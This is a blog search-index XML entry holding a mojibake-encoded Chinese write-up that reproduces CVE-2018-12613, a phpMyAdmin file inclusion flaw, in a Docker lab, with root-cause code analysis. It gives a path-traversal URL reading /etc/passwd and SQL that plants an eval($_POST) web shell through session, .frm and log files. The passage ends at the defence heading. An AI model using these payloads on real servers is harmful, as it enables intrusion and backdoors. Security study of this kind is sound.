<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘CVE-2018-12613 - phpmyadminåå°ä»»æ„æ–‡ä»¶åŒ…å«</title>
      <link href="post/202103242336.html"/>
      <url>post/202103242336.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00 ç®€è¿°"></a>0x00 ç®€è¿°</h2><p>ç”±äºå¯¹index.phpä¸­åŒ…å«æ–‡ä»¶çš„targetå‚æ•°æœªä½œä¸¥æ ¼çš„å®‰å…¨æ ¡éªŒï¼Œå¯¼è‡´å¯ä»¥è¢«åˆ©ç”¨ç»•è¿‡ç™½åå•ã€é»‘åå•æ ¡éªŒä»è€Œè¿›è¡Œæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œè¾¾åˆ°GetShellå’Œå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p><p>è¦æƒ³åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¿…é¡»ç»è¿‡èº«ä»½éªŒè¯ï¼Œä½†åœ¨è¿™äº›æƒ…å†µä¸‹é™¤å¤–ï¼š</p><ol><li>$ cfg [â€˜AllowArbitraryServerâ€™] =<br>trueï¼šæ”»å‡»è€…å¯ä»¥æŒ‡å®šä»–/å¥¹å·²ç»æ§åˆ¶çš„ä»»ä½•ä¸»æœºï¼Œå¹¶åœ¨phpMyAdminä¸Šæ‰§è¡Œä»»æ„ä»£ç </li><li>$ cfg [â€˜ServerDefaultâ€™] = 0ï¼šè¿™ä¼šç»•è¿‡ç™»å½•å¹¶åœ¨æ²¡æœ‰ä»»ä½•èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹è¿è¡Œæ˜“å—æ”»å‡»çš„ä»£ç </li></ol><p>å½±å“ç‰ˆæœ¬ï¼š</p><ul><li>Phpmyadmin Phpmyadmin 4.8.0</li><li>Phpmyadmin Phpmyadmin 4.8.0.1</li><li>Phpmyadmin Phpmyadmin 4.8.1</li></ul><h2 id="0x01-æ¼æ´éªŒè¯"><a href="#0x01-æ¼æ´éªŒè¯" class="headerlink" title="0x01 æ¼æ´éªŒè¯"></a>0x01 æ¼æ´éªŒè¯</h2><p>Dockeræ‹‰å–é¶åœºç¯å¢ƒï¼Œåˆ›å»ºé¶åœºç¯å¢ƒ<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808066.png" alt="2020-09-28_21-40-20.png"></p><p>æµè§ˆå™¨è®¿é—®8080ç«¯å£ï¼Œå³å¯è¿›å…¥phpmyadminç•Œé¢ï¼Œå› ä¸ºé¶åœºç”¨çš„æ˜¯configæ–¹å¼çš„èº«ä»½éªŒè¯ï¼Œå› æ­¤ä¸éœ€è¦ä½¿ç”¨è´¦å·å¯†ç ç™»å½•<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808074.png" alt="2020-09-28_21-57-06.png"></p><p>æ ¹æ®æ¼æ´æŠ¥å‘Šå’Œç½‘ä¸Šå¸ˆå‚…ä»¬çš„å¤ç°æ–‡ç« ï¼Œæ˜¯åœ¨index.phpæ–‡ä»¶å¤„å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ‰€ä»¥éªŒè¯ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.11.12:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¯»å–passwdæ–‡ä»¶<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808090.png" alt="2020-09-28_22-26-26.png"></p><p>æ­¤æ—¶å¯ä»¥åˆ©ç”¨sessionæ–‡ä»¶å†™å…¥**phpinfo()**æœ¨é©¬ï¼Œé¦–å…ˆæ‰§è¡ŒSQLè¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç„¶åF12æŸ¥çœ‹æ­¤æ—¶ç”¨æˆ·çš„sessionIDï¼Œä¹Ÿå°±æ˜¯phpmyadminçš„Cookieå€¼ï¼Œæ­¤å€¼å°±æ˜¯Mysqlä¿å­˜åœ¨æœ¬åœ°çš„ä¸´æ—¶ä¼šè¯æ–‡ä»¶ï¼Œä½¿ç”¨ä»¥ä¸‹urlè®¿é—®è¯¥ä¸´æ—¶æ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œæ­¤å‰æ’å…¥çš„æœ¨é©¬è¯­å¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.11.12:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_8f36723f61b00567f291c3e7218be400</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šéœ€è¦å°†sess_åçš„å†…å®¹æ”¹ä¸ºè‡ªå·±å½“å‰çš„Cookieå€¼<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808107.png" alt="2020-09-28_22-29-49.png"></p><h2 id="0x02-GetShell"><a href="#0x02-GetShell" class="headerlink" title="0x02 GetShell"></a>0x02 GetShell</h2><h3 id="1-åˆ©ç”¨sesionæ–‡ä»¶"><a href="#1-åˆ©ç”¨sesionæ–‡ä»¶" class="headerlink" title="1.åˆ©ç”¨sesionæ–‡ä»¶"></a>1.åˆ©ç”¨sesionæ–‡ä»¶</h3><p>æ‰§è¡Œä»¥ä¸‹SQLå‘½ä»¤ï¼ŒåŒä¸Šæ–¹æ³•è®¿é—®ä¸´æ—¶sessionæ–‡ä»¶ï¼Œå³å¯phpå‘½ä»¤åœ¨ç½‘ç«™ç›®å½•ä¸‹åˆ›å»ºa.phpå¹¶å†™å…¥ä¸€å¥è¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `<span class="operator">&lt;</span>?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);?<span class="operator">&gt;</span>`;</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808122.png" alt="2020-09-28_23-19-15.png"></p><p>èšå‰‘æˆåŠŸè¿æ¥ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808128.png" alt="2020-09-28_23-19-45.png"></p><p>å¯æ‰“å¼€è™šæ‹Ÿç»ˆç«¯å’Œæ–‡ä»¶ç³»ç»Ÿ<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808145.png" alt="2020-09-28_23-20-22.png"></p><h3 id="2-åˆ©ç”¨æ•°æ®åº“æ–‡ä»¶ï¼ˆfrmè¡¨ç»“æ„æ–‡ä»¶ï¼‰"><a href="#2-åˆ©ç”¨æ•°æ®åº“æ–‡ä»¶ï¼ˆfrmè¡¨ç»“æ„æ–‡ä»¶ï¼‰" class="headerlink" title="2.åˆ©ç”¨æ•°æ®åº“æ–‡ä»¶ï¼ˆfrmè¡¨ç»“æ„æ–‡ä»¶ï¼‰"></a>2.åˆ©ç”¨æ•°æ®åº“æ–‡ä»¶ï¼ˆfrmè¡¨ç»“æ„æ–‡ä»¶ï¼‰</h3><p>é€šè¿‡åˆ›å»ºè¡¨å¹¶å°†å­—æ®µåå®šä¹‰ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œéšååˆ©ç”¨åŒ…å«è®¿é—®è¯¥æ–‡ä»¶å³å¯ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808231.png" alt="2020-09-28_23-53-41.png"></p><p>ä½†æ˜¯å› ä¸ºæˆ‘åœ¨Dockerä¸Šæ­å»ºçš„ç¯å¢ƒï¼ŒWebå’ŒMysqlç”¨çš„2ä¸ªä¸»æœºç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯åº“ç«™åˆ†ç¦»ï¼Œæ‰€ä»¥æ— æ³•åŒ…å«æ•°æ®åº“æ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥åœ¨Mysqlè™šæ‹Ÿæœºé‡Œçœ‹åˆ°æœ¨é©¬ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808242.png" alt="2020-09-28_23-48-48.png"></p><p>æ‰€ä»¥å’Œä¸Šè¾¹sessionæ–‡ä»¶ä¸€æ ·ï¼Œåªéœ€è¦å°†æ•°æ®åº“å­—æ®µåè®¾ç½®ä¸ºä»¥ä¸‹è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `<span class="operator">&lt;</span>?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);?<span class="operator">&gt;</span>`;</span><br></pre></td></tr></table></figure><p>ç„¶ååŒ…å«ç›¸åº”çš„test.frmæ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤åœ¨ç½‘ç«™ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªa.phpçš„æœ¨é©¬</p><p>ä¸ºäº†æµ‹è¯•ï¼Œæˆ‘ç›´æ¥åœ¨Webä¸»å¥ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªfrmæ–‡ä»¶ï¼Œç„¶ååœ¨phpmyadminä¸­åŒ…å«è¯¥æ–‡ä»¶ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808254.png" alt="2020-09-29_00-10-55.png"></p><p>å³å¯åˆ›å»ºa.phpï¼Œèšå‰‘è¿æ¥ï¼ŒæˆåŠŸè¿›å…¥shellç¯å¢ƒï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808372.png" alt="2020-09-29_00-12-11.png"><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808378.png" alt="2020-09-29_00-08-37.png"></p><h3 id="3-åˆ©ç”¨æ—¥å¿—æ–‡ä»¶"><a href="#3-åˆ©ç”¨æ—¥å¿—æ–‡ä»¶" class="headerlink" title="3.åˆ©ç”¨æ—¥å¿—æ–‡ä»¶"></a>3.åˆ©ç”¨æ—¥å¿—æ–‡ä»¶</h3><p>è¿˜æœ‰å°±æ˜¯å¯ä»¥åˆ©ç”¨æ—¥å¿—æ–‡ä»¶ï¼Œä½†æ˜¯å½“å‰ç¯å¢ƒæƒé™ä¸è¶³ï¼Œä¸”æ²¡æœ‰å¼€å¯æ—¥å¿—åŠŸèƒ½ï¼Œæ‰€ä»¥æ— æ³•å¤ç°ï¼Œå…·ä½“åŸç†åŒä»¥ä¸Šä¸¤ç§æ–¹æ³•ã€‚</p><p>å› ä¸ºæ˜¯å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥å¦‚æœä¸æ˜¯åº“ç«™åˆ†ç¦»çš„æƒ…å†µä¸‹ï¼Œæ˜¯ä¸éœ€è¦ä¿®æ”¹æ—¥å¿—è·¯å¾„ä¸ºç½‘ç«™æ ¹è·¯å¾„çš„ï¼Œä»»æ„è·¯å¾„å³å¯ï¼Œåªéœ€åˆ©ç”¨åŒ…å«æ¼æ´åŒ…å«è¯¥æ—¥å¿—æ–‡ä»¶ï¼Œæ‰§è¡Œçš„phpå‘½ä»¤æ˜¯åœ¨ç½‘ç«™æ ¹è·¯å¾„åˆ›å»ºæ–°çš„æœ¨é©¬æ–‡ä»¶ã€‚</p><p>æ‰“å¼€general_logï¼šset global general_log = on<br>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `<span class="operator">&lt;</span>?php fputs(fopen(&quot;/var/www/html/a.php&quot;,&quot;w&quot;),<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);?<span class="operator">&gt;</span>`;</span><br></pre></td></tr></table></figure><p>åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼Œå³å¯åœ¨ç½‘ç«™æ ¹ç›®å½•ç”Ÿæˆa.phpçš„ä¸€å¥è¯æœ¨é©¬ã€‚</p><h2 id="0x03-åŸç†åˆ†æ"><a href="#0x03-åŸç†åˆ†æ" class="headerlink" title="0x03 åŸç†åˆ†æ"></a>0x03 åŸç†åˆ†æ</h2><p>æ¼æ´å½¢æˆåœ¨index.phpæ–‡ä»¶ä¸­ï¼Œé€šè¿‡includesæ¥åŠ è½½ä¼ å…¥çš„targetå‚æ•°æ–‡ä»¶ï¼Œåœ¨ç¬¬55è¡Œåˆ°59è¡Œå¯¹targetå‚æ•°åšäº†è¿‡æ»¤ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808394.png" alt="2020-09-29_09-37-25.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>éç©º</li><li>æ˜¯å­—ç¬¦ä¸²</li><li>ä¸èƒ½åŒ…å«index</li><li>ä¸åœ¨target_blacklisté»‘åå•å†…</li></ol><p>å…¶ä¸­target_blacklistå†…å®¹åœ¨50åˆ°52è¡Œå®šä¹‰ï¼šimport.phpã€export.php<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808406.png" alt="2020-09-29_10-32-13.png"></p><p> ç¬¬5ä¸ªæ ¡éªŒï¼šé€šè¿‡Coreç±»çš„checkPageValidityæ–¹æ³•æ ¡éªŒé¡µé¢åˆæ³•æ€§</p><p>åœ¨æºç ä¸­æ‰¾åˆ°Coreç±»ï¼Œå¯¼å‡ºåˆ°æœ¬åœ°<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808419.png" alt="2020-09-29_10-52-45.png"></p><p>åœ¨Coreç±»443è¡Œæ‰¾åˆ°äº†checkPageValidityæ–¹æ³•ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808430.png" alt="2020-09-29_10-53-58.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œç¬¬452è¡Œåˆ¤æ–­ä¼ è¿›çš„pageå‚æ•°æ˜¯å¦åœ¨whitelistç™½åå•å†…ï¼Œå¦‚æœåœ¨å†…åˆ™åˆ¤æ–­æˆåŠŸï¼Œè¿”å›Trueï¼Œå› æ­¤å…³é”®ç‚¹å°±æ˜¯è®©pageä¹Ÿå°±æ˜¯$_REQUEST[â€˜targetâ€™]ï¼Œå³targetä¼ å…¥çš„æ–‡ä»¶åå­˜åœ¨äºè¯¥ç™½åå•whitelistå†…</p><p>è¯¥å‡½æ•°ä¸­whitelistå‚æ•°æ˜¯æœ‰é»˜è®¤å€¼çš„ï¼Œé»˜è®¤ä¸ºç©ºï¼Œè€Œwhitelistç™½åå•åˆåœ¨ç¬¬445åˆ°447è¡Œåšäº†åˆ¤æ–­ï¼Œåˆ¤æ–­ä¼ å…¥çš„whitelistå‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™å°†Coreç±»ä¸­çš„$goto_whitelistèµ‹å€¼ç»™whitelistï¼Œå› ä¸ºåœ¨index.phpæ–‡ä»¶ä¸­ç”µæ³³è¯¥æ–¹æ³•æ—¶å¹¶æœªæŒ‡å®šwhitelistï¼Œå› æ­¤æ­¤æ—¶çš„whitelistå†…å®¹å°±æ˜¯Coreç±»ä¸­çš„goto_whitelistå†…å®¹</p><p>å¾€å‰æ‰¾ï¼Œåœ¨Coreç±»çš„31è¡Œå®šä¹‰äº†$goto_whitelistï¼Œå¦‚ä¸‹ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808471.png" alt="2020-09-29_10-59-57.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œåªéœ€è¦å°†targetå‚æ•°è®¾å®šåœ¨è¯¥ç™½åå•å†…ï¼Œå³å¯æˆåŠŸè¿”å›Trueï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦åšçš„æ˜¯ç»™targetå‚æ•°ç»§ç»­ä¼ å‚ï¼Œè¾¾åˆ°ä»»æ„æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥è¿˜éœ€è¦çœ‹ä¸‹è¾¹çš„ï¼Ÿæ ¡éªŒã€‚</p><p>ç½‘ä¸Šæ–‡ç« éƒ½å¯¹456è¡Œåˆ°473è¡Œçš„ï¼Ÿæ ¡éªŒåšäº†åˆ†æï¼Œå¾—åˆ°çš„ç»“æœæ˜¯éœ€è¦å¯¹ï¼Ÿè¿›è¡ŒäºŒæ¬¡URLç¼–ç æ¥ç»•è¿‡æ ¡éªŒï¼Œä½†æ˜¯å…¶å®ç”±äºä»£ç çš„é€»è¾‘æ˜¯å…ˆç”¨ï¼Ÿè¿›è¡Œæˆªæ–­ï¼Œå–å‡ºï¼Ÿå‰çš„æ–‡ä»¶åæ¥åšç™½åå•æ ¡éªŒï¼ŒæˆåŠŸç›´æ¥è¿”å›Trueï¼Œä¸å†æ‰§è¡Œä¸‹è¾¹urldecodeåçš„ï¼Ÿæ ¡éªŒï¼Œæ‰€ä»¥å…¶å®ä¸éœ€è¦å¯¹ï¼Ÿåšç¼–ç å¤„ç†ï¼Œä¹Ÿå¯ä»¥æˆåŠŸæ‰§è¡Œï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808488.png" alt="2020-09-29_11-12-41.png"></p><p>ä½†æ˜¯è¿˜æ˜¯åˆ†æä¸€ä¸‹åŸç†ï¼š</p><p>è¿™éƒ¨åˆ†ä»£ç æ˜¯è¿™æ ·çš„ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808495.png" alt="2020-09-29_11-26-32.png"></p><p>å¯¹pageå‚æ•°åšäº†ä¸¤æ¬¡ï¼Ÿçš„æˆªæ–­åˆ¤æ–­ï¼Œå°†ï¼Ÿå‰çš„æ–‡ä»¶ååšç™½åå•æ ¡éªŒï¼Œç¬¬ä¸€æ¬¡ç›´æ¥æˆªæ–­ï¼Œå¤±è´¥åè¿›è¡Œurlè§£ç å†æ¬¡æˆªæ–­åˆ¤æ–­ã€‚</p><p>å…¶å®ä¹Ÿå°±è¡¨ç¤ºå…è®¸targetå‚æ•°å¸¦å‚ï¼Œå¦‚æœä¼ å…¥çš„targetå‚æ•°ä¹Ÿæ˜¯å¸¦å‚çš„è¯ï¼ŒåŒæ ·ä¼šå°†å…¶å‚æ•°æŒ‡å‘çš„æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºè¿™ç§æœºåˆ¶å¯¼è‡´äº†ä»»æ„æ–‡ä»¶åŒ…å«ã€‚</p><p>ä¸å¾—ä¸è¯´phpmyadminå¼€å‘äººå‘˜è€ƒè™‘çš„å¤ªå‘¨åˆ°äº†ï¼Œåˆæ˜¯ä¸»åŠ¨urldecodeï¼Œåˆæ˜¯å¯ä»¥å‚æ•°ç»§ç»­ä¼ å‚ï¼Œå¤šç§åˆ¤æ–­éƒ½å¯ä»¥è¿”å›Trueï¼ŒçœŸæ˜¯è´´å¿ƒï¼Œæ³ªç›®~ğŸ˜­ğŸ˜­ğŸ˜­</p><h2 id="0x04-é˜²å¾¡"><a href="#0x04-é˜²å¾¡" class="headerlink" title="0x04 é˜²å¾¡"></a>0x04 